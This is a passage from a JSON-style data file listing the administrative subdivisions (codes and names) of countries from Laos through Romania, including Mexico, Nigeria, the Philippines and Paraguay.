      ""type"": ""state""
    },
    ""XI"": {
      ""name"": ""Xiangkhouang"",
      ""type"": ""state""
    },
    ""XS"": {
      ""name"": ""Xaisomboun"",
      ""type"": ""state""
    },
  },
  ""LB"": {},
  ""LR"": {
    ""BM"": {
      ""name"": ""Bomi"",
      ""type"": ""state""
    },
    ""BN"": {
      ""name"": ""Bong"",
      ""type"": ""state""
    },
    ""GA"": {
      ""name"": ""Gbarpolu"",
      ""type"": ""state""
    },
    ""GB"": {
      ""name"": ""Grand Bassa"",
      ""type"": ""state""
    },
    ""GC"": {
      ""name"": ""Grand Cape Mount"",
      ""type"": ""state""
    },
    ""GG"": {
      ""name"": ""Grand Gedeh"",
      ""type"": ""state""
    },
    ""GK"": {
      ""name"": ""Grand Kru"",
      ""type"": ""state""
    },
    ""LO"": {
      ""name"": ""Lofa"",
      ""type"": ""state""
    },
    ""MA"": {
      ""name"": ""Margibi"",
      ""type"": ""state""
    },
    ""MY"": {
      ""name"": ""Maryland"",
      ""type"": ""state""
    },
    ""MO"": {
      ""name"": ""Montserrado"",
      ""type"": ""state""
    },
    ""NM"": {
      ""name"": ""Nimba"",
      ""type"": ""state""
    },
    ""RV"": {
      ""name"": ""Rivercess"",
      ""type"": ""state""
    },
    ""RG"": {
      ""name"": ""River Gee"",
      ""type"": ""state""
    },
    ""SN"": {
      ""name"": ""Sinoe"",
      ""type"": ""state""
    },
  },
  ""LU"": {},
  ""MD"": {
    ""C"": {
      ""name"": ""Chi\u0219in\u0103u"",
      ""type"": ""state""
    },
    ""BL"": {
      ""name"": ""B\u0103l\u021bi"",
      ""type"": ""state""
    },
    ""AN"": {
      ""name"": ""Anenii Noi"",
      ""type"": ""state""
    },
    ""BS"": {
      ""name"": ""Basarabeasca"",
      ""type"": ""state""
    },
    ""BR"": {
      ""name"": ""Briceni"",
      ""type"": ""state""
    },
    ""CH"": {
      ""name"": ""Cahul"",
      ""type"": ""state""
    },
    ""CT"": {
      ""name"": ""Cantemir"",
      ""type"": ""state""
    },
    ""CL"": {
      ""name"": ""C\u0103l\u0103ra\u0219i"",
      ""type"": ""state""
    },
    ""CS"": {
      ""name"": ""C\u0103u\u0219eni"",
      ""type"": ""state""
    },
    ""CM"": {
      ""name"": ""Cimi\u0219lia"",
      ""type"": ""state""
    },
    ""CR"": {
      ""name"": ""Criuleni"",
      ""type"": ""state""
    },
    ""DN"": {
      ""name"": ""Dondu\u0219eni"",
      ""type"": ""state""
    },
    ""DR"": {
      ""name"": ""Drochia"",
      ""type"": ""state""
    },
    ""DB"": {
      ""name"": ""Dub\u0103sari"",
      ""type"": ""state""
    },
    ""ED"": {
      ""name"": ""Edine\u021b"",
      ""type"": ""state""
    },
    ""FL"": {
      ""name"": ""F\u0103le\u0219ti"",
      ""type"": ""state""
    },
    ""FR"": {
      ""name"": ""Flore\u0219ti"",
      ""type"": ""state""
    },
    ""GE"": {
      ""name"": ""UTA G\u0103g\u0103uzia"",
      ""type"": ""state""
    },
    ""GL"": {
      ""name"": ""Glodeni"",
      ""type"": ""state""
    },
    ""HN"": {
      ""name"": ""H\u00eence\u0219ti"",
      ""type"": ""state""
    },
    ""IL"": {
      ""name"": ""Ialoveni"",
      ""type"": ""state""
    },
    ""LV"": {
      ""name"": ""Leova"",
      ""type"": ""state""
    },
    ""NS"": {
      ""name"": ""Nisporeni"",
      ""type"": ""state""
    },
    ""OC"": {
      ""name"": ""Ocni\u021ba"",
      ""type"": ""state""
    },
    ""OR"": {
      ""name"": ""Orhei"",
      ""type"": ""state""
    },
    ""RZ"": {
      ""name"": ""Rezina"",
      ""type"": ""state""
    },
    ""RS"": {
      ""name"": ""R\u00ee\u0219cani"",
      ""type"": ""state""
    },
    ""SG"": {
      ""name"": ""S\u00eengerei"",
      ""type"": ""state""
    },
    ""SR"": {
      ""name"": ""Soroca"",
      ""type"": ""state""
    },
    ""ST"": {
      ""name"": ""Str\u0103\u0219eni"",
      ""type"": ""state""
    },
    ""SD"": {
      ""name"": ""\u0218old\u0103ne\u0219ti"",
      ""type"": ""state""
    },
    ""SV"": {
      ""name"": ""\u0218tefan Vod\u0103"",
      ""type"": ""state""
    },
    ""TR"": {
      ""name"": ""Taraclia"",
      ""type"": ""state""
    },
    ""TL"": {
      ""name"": ""Telene\u0219ti"",
      ""type"": ""state""
    },
    ""UN"": {
      ""name"": ""Ungheni"",
      ""type"": ""state""
    },
  },
  ""MQ"": {},
  ""MT"": {},
  ""MX"": {
    ""DF"": {
      ""name"": ""Ciudad de M\u00e9xico"",
      ""type"": ""state""
    },
    ""JA"": {
      ""name"": ""Jalisco"",
      ""type"": ""state""
    },
    ""NL"": {
      ""name"": ""Nuevo Le\u00f3n"",
      ""type"": ""state""
    },
    ""AG"": {
      ""name"": ""Aguascalientes"",
      ""type"": ""state""
    },
    ""BC"": {
      ""name"": ""Baja California"",
      ""type"": ""state""
    },
    ""BS"": {
      ""name"": ""Baja California Sur"",
      ""type"": ""state""
    },
    ""CM"": {
      ""name"": ""Campeche"",
      ""type"": ""state""
    },
    ""CS"": {
      ""name"": ""Chiapas"",
      ""type"": ""state""
    },
    ""CH"": {
      ""name"": ""Chihuahua"",
      ""type"": ""state""
    },
    ""CO"": {
      ""name"": ""Coahuila"",
      ""type"": ""state""
    },
    ""CL"": {
      ""name"": ""Colima"",
      ""type"": ""state""
    },
    ""DG"": {
      ""name"": ""Durango"",
      ""type"": ""state""
    },
    ""GT"": {
      ""name"": ""Guanajuato"",
      ""type"": ""state""
    },
    ""GR"": {
      ""name"": ""Guerrero"",
      ""type"": ""state""
    },
    ""HG"": {
      ""name"": ""Hidalgo"",
      ""type"": ""state""
    },
    ""MX"": {
      ""name"": ""Estado de M\u00e9xico"",
      ""type"": ""state""
    },
    ""MI"": {
      ""name"": ""Michoac\u00e1n"",
      ""type"": ""state""
    },
    ""MO"": {
      ""name"": ""Morelos"",
      ""type"": ""state""
    },
    ""NA"": {
      ""name"": ""Nayarit"",
      ""type"": ""state""
    },
    ""OA"": {
      ""name"": ""Oaxaca"",
      ""type"": ""state""
    },
    ""PU"": {
      ""name"": ""Puebla"",
      ""type"": ""state""
    },
    ""QT"": {
      ""name"": ""Quer\u00e9taro"",
      ""type"": ""state""
    },
    ""QR"": {
      ""name"": ""Quintana Roo"",
      ""type"": ""state""
    },
    ""SL"": {
      ""name"": ""San Luis Potos\u00ed"",
      ""type"": ""state""
    },
    ""SI"": {
      ""name"": ""Sinaloa"",
      ""type"": ""state""
    },
    ""SO"": {
      ""name"": ""Sonora"",
      ""type"": ""state""
    },
    ""TB"": {
      ""name"": ""Tabasco"",
      ""type"": ""state""
    },
    ""TM"": {
      ""name"": ""Tamaulipas"",
      ""type"": ""state""
    },
    ""TL"": {
      ""name"": ""Tlaxcala"",
      ""type"": ""state""
    },
    ""VE"": {
      ""name"": ""Veracruz"",
      ""type"": ""state""
    },
    ""YU"": {
      ""name"": ""Yucat\u00e1n"",
      ""type"": ""state""
    },
    ""ZA"": {
      ""name"": ""Zacatecas"",
      ""type"": ""state""
    },
  },
  ""MY"": {
    ""JHR"": {
      ""name"": ""Johor"",
      ""type"": ""state""
    },
    ""KDH"": {
      ""name"": ""Kedah"",
      ""type"": ""state""
    },
    ""KTN"": {
      ""name"": ""Kelantan"",
      ""type"": ""state""
    },
    ""LBN"": {
      ""name"": ""Labuan"",
      ""type"": ""state""
    },
    ""MLK"": {
      ""name"": ""Malacca (Melaka)"",
      ""type"": ""state""
    },
    ""NSN"": {
      ""name"": ""Negeri Sembilan"",
      ""type"": ""state""
    },
    ""PHG"": {
      ""name"": ""Pahang"",
      ""type"": ""state""
    },
    ""PNG"": {
      ""name"": ""Penang (Pulau Pinang)"",
      ""type"": ""state""
    },
    ""PRK"": {
      ""name"": ""Perak"",
      ""type"": ""state""
    },
    ""PLS"": {
      ""name"": ""Perlis"",
      ""type"": ""state""
    },
    ""SBH"": {
      ""name"": ""Sabah"",
      ""type"": ""state""
    },
    ""SWK"": {
      ""name"": ""Sarawak"",
      ""type"": ""state""
    },
    ""SGR"": {
      ""name"": ""Selangor"",
      ""type"": ""state""
    },
    ""TRG"": {
      ""name"": ""Terengganu"",
      ""type"": ""state""
    },
    ""PJY"": {
      ""name"": ""Putrajaya"",
      ""type"": ""state""
    },
    ""KUL"": {
      ""name"": ""Kuala Lumpur"",
      ""type"": ""state""
    },
  },
  ""MZ"": {
    ""MZP"": {
      ""name"": ""Cabo Delgado"",
      ""type"": ""state""
    },
    ""MZG"": {
      ""name"": ""Gaza"",
      ""type"": ""state""
    },
    ""MZI"": {
      ""name"": ""Inhambane"",
      ""type"": ""state""
    },
    ""MZB"": {
      ""name"": ""Manica"",
      ""type"": ""state""
    },
    ""MZL"": {
      ""name"": ""Maputo Province"",
      ""type"": ""state""
    },
    ""MZMPM"": {
      ""name"": ""Maputo"",
      ""type"": ""state""
    },
    ""MZN"": {
      ""name"": ""Nampula"",
      ""type"": ""state""
    },
    ""MZA"": {
      ""name"": ""Niassa"",
      ""type"": ""state""
    },
    ""MZS"": {
      ""name"": ""Sofala"",
      ""type"": ""state""
    },
    ""MZT"": {
      ""name"": ""Tete"",
      ""type"": ""state""
    },
    ""MZQ"": {
      ""name"": ""Zamb\u00e9zia"",
      ""type"": ""state""
    },
  },
  ""NA"": {
    ""ER"": {
      ""name"": ""Erongo"",
      ""type"": ""state""
    },
    ""HA"": {
      ""name"": ""Hardap"",
      ""type"": ""state""
    },
    ""KA"": {
      ""name"": ""Karas"",
      ""type"": ""state""
    },
    ""KE"": {
      ""name"": ""Kavango East"",
      ""type"": ""state""
    },
    ""KW"": {
      ""name"": ""Kavango West"",
      ""type"": ""state""
    },
    ""KH"": {
      ""name"": ""Khomas"",
      ""type"": ""state""
    },
    ""KU"": {
      ""name"": ""Kunene"",
      ""type"": ""state""
    },
    ""OW"": {
      ""name"": ""Ohangwena"",
      ""type"": ""state""
    },
    ""OH"": {
      ""name"": ""Omaheke"",
      ""type"": ""state""
    },
    ""OS"": {
      ""name"": ""Omusati"",
      ""type"": ""state""
    },
    ""ON"": {
      ""name"": ""Oshana"",
      ""type"": ""state""
    },
    ""OT"": {
      ""name"": ""Oshikoto"",
      ""type"": ""state""
    },
    ""OD"": {
      ""name"": ""Otjozondjupa"",
      ""type"": ""state""
    },
    ""CA"": {
      ""name"": ""Zambezi"",
      ""type"": ""state""
    },
  },
  ""NG"": {
    ""AB"": {
      ""name"": ""Abia"",
      ""type"": ""state""
    },
    ""FC"": {
      ""name"": ""Abuja"",
      ""type"": ""state""
    },
    ""AD"": {
      ""name"": ""Adamawa"",
      ""type"": ""state""
    },
    ""AK"": {
      ""name"": ""Akwa Ibom"",
      ""type"": ""state""
    },
    ""AN"": {
      ""name"": ""Anambra"",
      ""type"": ""state""
    },
    ""BA"": {
      ""name"": ""Bauchi"",
      ""type"": ""state""
    },
    ""BY"": {
      ""name"": ""Bayelsa"",
      ""type"": ""state""
    },
    ""BE"": {
      ""name"": ""Benue"",
      ""type"": ""state""
    },
    ""BO"": {
      ""name"": ""Borno"",
      ""type"": ""state""
    },
    ""CR"": {
      ""name"": ""Cross River"",
      ""type"": ""state""
    },
    ""DE"": {
      ""name"": ""Delta"",
      ""type"": ""state""
    },
    ""EB"": {
      ""name"": ""Ebonyi"",
      ""type"": ""state""
    },
    ""ED"": {
      ""name"": ""Edo"",
      ""type"": ""state""
    },
    ""EK"": {
      ""name"": ""Ekiti"",
      ""type"": ""state""
    },
    ""EN"": {
      ""name"": ""Enugu"",
      ""type"": ""state""
    },
    ""GO"": {
      ""name"": ""Gombe"",
      ""type"": ""state""
    },
    ""IM"": {
      ""name"": ""Imo"",
      ""type"": ""state""
    },
    ""JI"": {
      ""name"": ""Jigawa"",
      ""type"": ""state""
    },
    ""KD"": {
      ""name"": ""Kaduna"",
      ""type"": ""state""
    },
    ""KN"": {
      ""name"": ""Kano"",
      ""type"": ""state""
    },
    ""KT"": {
      ""name"": ""Katsina"",
      ""type"": ""state""
    },
    ""KE"": {
      ""name"": ""Kebbi"",
      ""type"": ""state""
    },
    ""KO"": {
      ""name"": ""Kogi"",
      ""type"": ""state""
    },
    ""KW"": {
      ""name"": ""Kwara"",
      ""type"": ""state""
    },
    ""LA"": {
      ""name"": ""Lagos"",
      ""type"": ""state""
    },
    ""NA"": {
      ""name"": ""Nasarawa"",
      ""type"": ""state""
    },
    ""NI"": {
      ""name"": ""Niger"",
      ""type"": ""state""
    },
    ""OG"": {
      ""name"": ""Ogun"",
      ""type"": ""state""
    },
    ""ON"": {
      ""name"": ""Ondo"",
      ""type"": ""state""
    },
    ""OS"": {
      ""name"": ""Osun"",
      ""type"": ""state""
    },
    ""OY"": {
      ""name"": ""Oyo"",
      ""type"": ""state""
    },
    ""PL"": {
      ""name"": ""Plateau"",
      ""type"": ""state""
    },
    ""RI"": {
      ""name"": ""Rivers"",
      ""type"": ""state""
    },
    ""SO"": {
      ""name"": ""Sokoto"",
      ""type"": ""state""
    },
    ""TA"": {
      ""name"": ""Taraba"",
      ""type"": ""state""
    },
    ""YO"": {
      ""name"": ""Yobe"",
      ""type"": ""state""
    },
    ""ZA"": {
      ""name"": ""Zamfara"",
      ""type"": ""state""
    },
  },
  ""NL"": {},
  ""NO"": {},
  ""NP"": {
    ""BAG"": {
      ""name"": ""Bagmati"",
      ""type"": ""state""
    },
    ""BHE"": {
      ""name"": ""Bheri"",
      ""type"": ""state""
    },
    ""DHA"": {
      ""name"": ""Dhaulagiri"",
      ""type"": ""state""
    },
    ""GAN"": {
      ""name"": ""Gandaki"",
      ""type"": ""state""
    },
    ""JAN"": {
      ""name"": ""Janakpur"",
      ""type"": ""state""
    },
    ""KAR"": {
      ""name"": ""Karnali"",
      ""type"": ""state""
    },
    ""KOS"": {
      ""name"": ""Koshi"",
      ""type"": ""state""
    },
    ""LUM"": {
      ""name"": ""Lumbini"",
      ""type"": ""state""
    },
    ""MAH"": {
      ""name"": ""Mahakali"",
      ""type"": ""state""
    },
    ""MEC"": {
      ""name"": ""Mechi"",
      ""type"": ""state""
    },
    ""NAR"": {
      ""name"": ""Narayani"",
      ""type"": ""state""
    },
    ""RAP"": {
      ""name"": ""Rapti"",
      ""type"": ""state""
    },
    ""SAG"": {
      ""name"": ""Sagarmatha"",
      ""type"": ""state""
    },
    ""SET"": {
      ""name"": ""Seti"",
      ""type"": ""state""
    },
  },
  ""NZ"": {
    ""NL"": {
      ""name"": ""Northland"",
      ""type"": ""state""
    },
    ""AK"": {
      ""name"": ""Auckland"",
      ""type"": ""state""
    },
    ""WA"": {
      ""name"": ""Waikato"",
      ""type"": ""state""
    },
    ""BP"": {
      ""name"": ""Bay of Plenty"",
      ""type"": ""state""
    },
    ""TK"": {
      ""name"": ""Taranaki"",
      ""type"": ""state""
    },
    ""GI"": {
      ""name"": ""Gisborne"",
      ""type"": ""state""
    },
    ""HB"": {
      ""name"": ""Hawke\u2019s Bay"",
      ""type"": ""state""
    },
    ""MW"": {
      ""name"": ""Manawatu-Wanganui"",
      ""type"": ""state""
    },
    ""WE"": {
      ""name"": ""Wellington"",
      ""type"": ""state""
    },
    ""NS"": {
      ""name"": ""Nelson"",
      ""type"": ""state""
    },
    ""MB"": {
      ""name"": ""Marlborough"",
      ""type"": ""state""
    },
    ""TM"": {
      ""name"": ""Tasman"",
      ""type"": ""state""
    },
    ""WC"": {
      ""name"": ""West Coast"",
      ""type"": ""state""
    },
    ""CT"": {
      ""name"": ""Canterbury"",
      ""type"": ""state""
    },
    ""OT"": {
      ""name"": ""Otago"",
      ""type"": ""state""
    },
    ""SL"": {
      ""name"": ""Southland"",
      ""type"": ""state""
    },
  },
  ""PE"": {
    ""CAL"": {
      ""name"": ""El Callao"",
      ""type"": ""state""
    },
    ""LMA"": {
      ""name"": ""Municipalidad Metropolitana de Lima"",
      ""type"": ""state""
    },
    ""AMA"": {
      ""name"": ""Amazonas"",
      ""type"": ""state""
    },
    ""ANC"": {
      ""name"": ""Ancash"",
      ""type"": ""state""
    },
    ""APU"": {
      ""name"": ""Apur\u00edmac"",
      ""type"": ""state""
    },
    ""ARE"": {
      ""name"": ""Arequipa"",
      ""type"": ""state""
    },
    ""AYA"": {
      ""name"": ""Ayacucho"",
      ""type"": ""state""
    },
    ""CAJ"": {
      ""name"": ""Cajamarca"",
      ""type"": ""state""
    },
    ""CUS"": {
      ""name"": ""Cusco"",
      ""type"": ""state""
    },
    ""HUV"": {
      ""name"": ""Huancavelica"",
      ""type"": ""state""
    },
    ""HUC"": {
      ""name"": ""Hu\u00e1nuco"",
      ""type"": ""state""
    },
    ""ICA"": {
      ""name"": ""Ica"",
      ""type"": ""state""
    },
    ""JUN"": {
      ""name"": ""Jun\u00edn"",
      ""type"": ""state""
    },
    ""LAL"": {
      ""name"": ""La Libertad"",
      ""type"": ""state""
    },
    ""LAM"": {
      ""name"": ""Lambayeque"",
      ""type"": ""state""
    },
    ""LIM"": {
      ""name"": ""Lima"",
      ""type"": ""state""
    },
    ""LOR"": {
      ""name"": ""Loreto"",
      ""type"": ""state""
    },
    ""MDD"": {
      ""name"": ""Madre de Dios"",
      ""type"": ""state""
    },
    ""MOQ"": {
      ""name"": ""Moquegua"",
      ""type"": ""state""
    },
    ""PAS"": {
      ""name"": ""Pasco"",
      ""type"": ""state""
    },
    ""PIU"": {
      ""name"": ""Piura"",
      ""type"": ""state""
    },
    ""PUN"": {
      ""name"": ""Puno"",
      ""type"": ""state""
    },
    ""SAM"": {
      ""name"": ""San Mart\u00edn"",
      ""type"": ""state""
    },
    ""TAC"": {
      ""name"": ""Tacna"",
      ""type"": ""state""
    },
    ""TUM"": {
      ""name"": ""Tumbes"",
      ""type"": ""state""
    },
    ""UCA"": {
      ""name"": ""Ucayali"",
      ""type"": ""state""
    },
  },
  ""PH"": {
    ""ABR"": {
      ""name"": ""Abra"",
      ""type"": ""state""
    },
    ""AGN"": {
      ""name"": ""Agusan del Norte"",
      ""type"": ""state""
    },
    ""AGS"": {
      ""name"": ""Agusan del Sur"",
      ""type"": ""state""
    },
    ""AKL"": {
      ""name"": ""Aklan"",
      ""type"": ""state""
    },
    ""ALB"": {
      ""name"": ""Albay"",
      ""type"": ""state""
    },
    ""ANT"": {
      ""name"": ""Antique"",
      ""type"": ""state""
    },
    ""APA"": {
      ""name"": ""Apayao"",
      ""type"": ""state""
    },
    ""AUR"": {
      ""name"": ""Aurora"",
      ""type"": ""state""
    },
    ""BAS"": {
      ""name"": ""Basilan"",
      ""type"": ""state""
    },
    ""BAN"": {
      ""name"": ""Bataan"",
      ""type"": ""state""
    },
    ""BTN"": {
      ""name"": ""Batanes"",
      ""type"": ""state""
    },
    ""BTG"": {
      ""name"": ""Batangas"",
      ""type"": ""state""
    },
    ""BEN"": {
      ""name"": ""Benguet"",
      ""type"": ""state""
    },
    ""BIL"": {
      ""name"": ""Biliran"",
      ""type"": ""state""
    },
    ""BOH"": {
      ""name"": ""Bohol"",
      ""type"": ""state""
    },
    ""BUK"": {
      ""name"": ""Bukidnon"",
      ""type"": ""state""
    },
    ""BUL"": {
      ""name"": ""Bulacan"",
      ""type"": ""state""
    },
    ""CAG"": {
      ""name"": ""Cagayan"",
      ""type"": ""state""
    },
    ""CAN"": {
      ""name"": ""Camarines Norte"",
      ""type"": ""state""
    },
    ""CAS"": {
      ""name"": ""Camarines Sur"",
      ""type"": ""state""
    },
    ""CAM"": {
      ""name"": ""Camiguin"",
      ""type"": ""state""
    },
    ""CAP"": {
      ""name"": ""Capiz"",
      ""type"": ""state""
    },
    ""CAT"": {
      ""name"": ""Catanduanes"",
      ""type"": ""state""
    },
    ""CAV"": {
      ""name"": ""Cavite"",
      ""type"": ""state""
    },
    ""CEB"": {
      ""name"": ""Cebu"",
      ""type"": ""state""
    },
    ""COM"": {
      ""name"": ""Compostela Valley"",
      ""type"": ""state""
    },
    ""NCO"": {
      ""name"": ""Cotabato"",
      ""type"": ""state""
    },
    ""DAV"": {
      ""name"": ""Davao del Norte"",
      ""type"": ""state""
    },
    ""DAS"": {
      ""name"": ""Davao del Sur"",
      ""type"": ""state""
    },
    ""DAC"": {
      ""name"": ""Davao Occidental"",
      ""type"": ""state""
    },
    ""DAO"": {
      ""name"": ""Davao Oriental"",
      ""type"": ""state""
    },
    ""DIN"": {
      ""name"": ""Dinagat Islands"",
      ""type"": ""state""
    },
    ""EAS"": {
      ""name"": ""Eastern Samar"",
      ""type"": ""state""
    },
    ""GUI"": {
      ""name"": ""Guimaras"",
      ""type"": ""state""
    },
    ""IFU"": {
      ""name"": ""Ifugao"",
      ""type"": ""state""
    },
    ""ILN"": {
      ""name"": ""Ilocos Norte"",
      ""type"": ""state""
    },
    ""ILS"": {
      ""name"": ""Ilocos Sur"",
      ""type"": ""state""
    },
    ""ILI"": {
      ""name"": ""Iloilo"",
      ""type"": ""state""
    },
    ""ISA"": {
      ""name"": ""Isabela"",
      ""type"": ""state""
    },
    ""KAL"": {
      ""name"": ""Kalinga"",
      ""type"": ""state""
    },
    ""LUN"": {
      ""name"": ""La Union"",
      ""type"": ""state""
    },
    ""LAG"": {
      ""name"": ""Laguna"",
      ""type"": ""state""
    },
    ""LAN"": {
      ""name"": ""Lanao del Norte"",
      ""type"": ""state""
    },
    ""LAS"": {
      ""name"": ""Lanao del Sur"",
      ""type"": ""state""
    },
    ""LEY"": {
      ""name"": ""Leyte"",
      ""type"": ""state""
    },
    ""MAG"": {
      ""name"": ""Maguindanao"",
      ""type"": ""state""
    },
    ""MAD"": {
      ""name"": ""Marinduque"",
      ""type"": ""state""
    },
    ""MAS"": {
      ""name"": ""Masbate"",
      ""type"": ""state""
    },
    ""MSC"": {
      ""name"": ""Misamis Occidental"",
      ""type"": ""state""
    },
    ""MSR"": {
      ""name"": ""Misamis Oriental"",
      ""type"": ""state""
    },
    ""MOU"": {
      ""name"": ""Mountain Province"",
      ""type"": ""state""
    },
    ""NEC"": {
      ""name"": ""Negros Occidental"",
      ""type"": ""state""
    },
    ""NER"": {
      ""name"": ""Negros Oriental"",
      ""type"": ""state""
    },
    ""NSA"": {
      ""name"": ""Northern Samar"",
      ""type"": ""state""
    },
    ""NUE"": {
      ""name"": ""Nueva Ecija"",
      ""type"": ""state""
    },
    ""NUV"": {
      ""name"": ""Nueva Vizcaya"",
      ""type"": ""state""
    },
    ""MDC"": {
      ""name"": ""Occidental Mindoro"",
      ""type"": ""state""
    },
    ""MDR"": {
      ""name"": ""Oriental Mindoro"",
      ""type"": ""state""
    },
    ""PLW"": {
      ""name"": ""Palawan"",
      ""type"": ""state""
    },
    ""PAM"": {
      ""name"": ""Pampanga"",
      ""type"": ""state""
    },
    ""PAN"": {
      ""name"": ""Pangasinan"",
      ""type"": ""state""
    },
    ""QUE"": {
      ""name"": ""Quezon"",
      ""type"": ""state""
    },
    ""QUI"": {
      ""name"": ""Quirino"",
      ""type"": ""state""
    },
    ""RIZ"": {
      ""name"": ""Rizal"",
      ""type"": ""state""
    },
    ""ROM"": {
      ""name"": ""Romblon"",
      ""type"": ""state""
    },
    ""WSA"": {
      ""name"": ""Samar"",
      ""type"": ""state""
    },
    ""SAR"": {
      ""name"": ""Sarangani"",
      ""type"": ""state""
    },
    ""SIQ"": {
      ""name"": ""Siquijor"",
      ""type"": ""state""
    },
    ""SOR"": {
      ""name"": ""Sorsogon"",
      ""type"": ""state""
    },
    ""SCO"": {
      ""name"": ""South Cotabato"",
      ""type"": ""state""
    },
    ""SLE"": {
      ""name"": ""Southern Leyte"",
      ""type"": ""state""
    },
    ""SUK"": {
      ""name"": ""Sultan Kudarat"",
      ""type"": ""state""
    },
    ""SLU"": {
      ""name"": ""Sulu"",
      ""type"": ""state""
    },
    ""SUN"": {
      ""name"": ""Surigao del Norte"",
      ""type"": ""state""
    },
    ""SUR"": {
      ""name"": ""Surigao del Sur"",
      ""type"": ""state""
    },
    ""TAR"": {
      ""name"": ""Tarlac"",
      ""type"": ""state""
    },
    ""TAW"": {
      ""name"": ""Tawi-Tawi"",
      ""type"": ""state""
    },
    ""ZMB"": {
      ""name"": ""Zambales"",
      ""type"": ""state""
    },
    ""ZAN"": {
      ""name"": ""Zamboanga del Norte"",
      ""type"": ""state""
    },
    ""ZAS"": {
      ""name"": ""Zamboanga del Sur"",
      ""type"": ""state""
    },
    ""ZSI"": {
      ""name"": ""Zamboanga Sibugay"",
      ""type"": ""state""
    },
    ""00"": {
      ""name"": ""Metro Manila"",
      ""type"": ""state""
    },
  },
  ""PK"": {
    ""JK"": {
      ""name"": ""Azad Kashmir"",
      ""type"": ""state""
    },
    ""BA"": {
      ""name"": ""Balochistan"",
      ""type"": ""state""
    },
    ""TA"": {
      ""name"": ""FATA"",
      ""type"": ""state""
    },
    ""GB"": {
      ""name"": ""Gilgit Baltistan"",
      ""type"": ""state""
    },
    ""IS"": {
      ""name"": ""Islamabad Capital Territory"",
      ""type"": ""state""
    },
    ""KP"": {
      ""name"": ""Khyber Pakhtunkhwa"",
      ""type"": ""state""
    },
    ""PB"": {
      ""name"": ""Punjab"",
      ""type"": ""state""
    },
    ""SD"": {
      ""name"": ""Sindh"",
      ""type"": ""state""
    },
  },
  ""PL"": {},
  ""PR"": {},
  ""PT"": {},
  ""PY"": {
    ""PY-ASU"": {
      ""name"": ""Asunci\u00f3n"",
      ""type"": ""state""
    },
    ""PY-1"": {
      ""name"": ""Concepci\u00f3n"",
      ""type"": ""state""
    },
    ""PY-2"": {
      ""name"": ""San Pedro"",
      ""type"": ""state""
    },
    ""PY-3"": {
      ""name"": ""Cordillera"",
      ""type"": ""state""
    },
    ""PY-4"": {
      ""name"": ""Guair\u00e1"",
      ""type"": ""state""
    },
    ""PY-5"": {
      ""name"": ""Caaguaz\u00fa"",
      ""type"": ""state""
    },
    ""PY-6"": {
      ""name"": ""Caazap\u00e1"",
      ""type"": ""state""
    },
    ""PY-7"": {
      ""name"": ""Itap\u00faa"",
      ""type"": ""state""
    },
    ""PY-8"": {
      ""name"": ""Misiones"",
      ""type"": ""state""
    },
    ""PY-9"": {
      ""name"": ""Paraguar\u00ed"",
      ""type"": ""state""
    },
    ""PY-10"": {
      ""name"": ""Alto Paran\u00e1"",
      ""type"": ""state""
    },
    ""PY-11"": {
      ""name"": ""Central"",
      ""type"": ""state""
    },
    ""PY-12"": {
      ""name"": ""\u00d1eembuc\u00fa"",
      ""type"": ""state""
    },
    ""PY-13"": {
      ""name"": ""Amambay"",
      ""type"": ""state""
    },
    ""PY-14"": {
      ""name"": ""Canindey\u00fa"",
      ""type"": ""state""
    },
    ""PY-15"": {
      ""name"": ""Presidente Hayes"",
      ""type"": ""state""
    },
    ""PY-16"": {
      ""name"": ""Alto Paraguay"",
      ""type"": ""state""
    },
    ""PY-17"": {
      ""name"": ""Boquer\u00f3n"",
      ""type"": ""state""
    },
  },
  ""RE"": {},
  ""RO"": {
    ""AB"": {
      ""name"": ""Alba"",
      ""type"": ""state""
    },
    ""AR"": {
      ""name"": ""Arad"",
      ""type"": ""state""
    },
    ""AG"": {
      ""name"": ""Arge\u0219"",
      ""type"": ""state""
    },
    ""BC"": {
      ""name"": ""Bac\u0103u"",
      ""type"": ""state""
    },
    ""BH"": {
      ""name"": ""Bihor"",
      ""type"": ""state""
    },
    ""BN"": {
      ""name"": ""Bistri\u021ba-N\u0103s\u0103ud"",
      ""type"": ""state""
    },
    ""BT"": {
      ""name"": ""Boto\u0219ani"",
      ""type"": ""state""
    },
    ""BR"": {
      ""name"": ""Br\u0103ila"",
      ""type"": ""state""
    },
    ""BV"": {
      ""name"": ""Bra\u0219ov"",
      ""type"": ""state""
    },
    ""B"": {
      ""name"": ""Bucure\u0219ti"",
      ""type"": ""state""
    },
    ""BZ"": {
      ""name"": ""Buz\u0103u"",
      ""type"": ""state""
    },
    ""CL"": {
      ""name"": ""C\u0103l\u0103ra\u0219i"",
      ""type"": ""state""
    },
    ""CS"": {
      ""name"": ""Cara\u0219-Severin"",
      ""type"": ""state""
    },
    ""CJ"": {
      ""name"": ""Cluj"",
      ""type"": ""state""
    },
    ""CT"": {
      ""name"": ""Constan\u021ba"",
      ""type"": ""state""
    },
    ""CV"": {
      ""name"": ""Covasna"",
      ""type"": ""state""
    },
    ""DB"": {
      ""name"": ""D\u00e2mbovi\u021ba"",
      ""type"": ""state""
    },
    ""DJ"": {
      ""name"": ""Dolj"",
      ""type"": ""state""
    },
    ""GL"": {
      ""name"": ""Gala\u021bi"",
      ""type"": ""state""
    },
    ""GR"": {
      ""name"": ""Giurgiu"",
      ""type"": ""state""
    },
    ""GJ"": {
      ""name"": ""Gorj"",
      ""type"": ""state""
    },
    ""HR"": {
      ""name"": ""Harghita"",
      ""type"": ""state""
    },
    ""HD"": {
      ""name"": ""Hunedoara"",
      ""type"": ""state""
    },
    ""IL"": {
      ""name"": ""Ialomi\u021ba"",
      ""type"": ""state""
    },
    ""IS"": {
      ""name"": ""Ia\u0219i"",
      ""type"": ""state""
    },
    ""IF"": {
      ""name"": ""Ilfov"",
      ""type"": ""state""
    },
    ""MM"": {
      ""name"": ""Maramure\u0219"",
      ""type"": ""state""
    },
    ""MH"": {
      ""name"": ""Mehedin\u021bi"",
      ""type"": ""state""
    },
    ""MS"": {
      ""name"": ""Mure\u0219"",
      ""type"": ""state""
    },
    ""NT"": {
      ""name"": ""Neam\u021b"",
      ""type"": ""state""
    },
    ""OT"": {
      ""name"": ""Olt"",
      ""type"": ""state""
    },
    ""PH"": {
      ""name"": ""Prahova"",
      ""type"": ""state""
    },
    ""SJ"": {
      ""name"": ""S\u0103laj"",
      ""type"": ""state""
    },
    ""SM"": {
      ""name"": ""Satu Mare"",
      ""type"": ""state""
    },
    ""SB"": {
      ""name"": ""Sibiu"",
      ""type"": ""state""
    },
    ""SV"": {
